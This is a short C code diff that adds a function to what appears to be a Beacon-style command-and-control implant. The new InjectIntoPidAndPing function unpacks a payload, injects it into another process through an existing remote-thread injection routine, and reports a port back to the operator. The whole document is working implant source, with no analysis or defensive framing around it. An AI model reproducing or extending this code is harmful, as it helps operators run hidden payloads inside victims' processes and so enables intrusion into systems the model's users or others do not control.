@@ -398,6 +398,20 @@ void InjectIntoPid(char* buffer, int length, BOOL x86)
 	CloseHandle(hProcess);
 }
 
+void InjectIntoPidAndPing(char* buffer, int length, BOOL x86)
+{
+	datap parser;
+	BeaconDataParse(&parser, buffer, length);
+	short port = BeaconDataShort(&parser);
+
+	int size = BeaconDataLength(&parser);
+	char* payload = BeaconDataBuffer(&parser);
+	InjectIntoPid(payload, size, x86);
+
+	port = htons(port);
+	BeaconOutput(CALLBACK_PING, (char*)&port, sizeof(port));
+}
+
 BOOL ExecuteViaCreateRemoteThread(HANDLE hProcess, LPVOID lpStartAddress, LPVOID lpParameter)
 {
 	return CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpStartAddress, lpParameter, 0, NULL) != NULL;
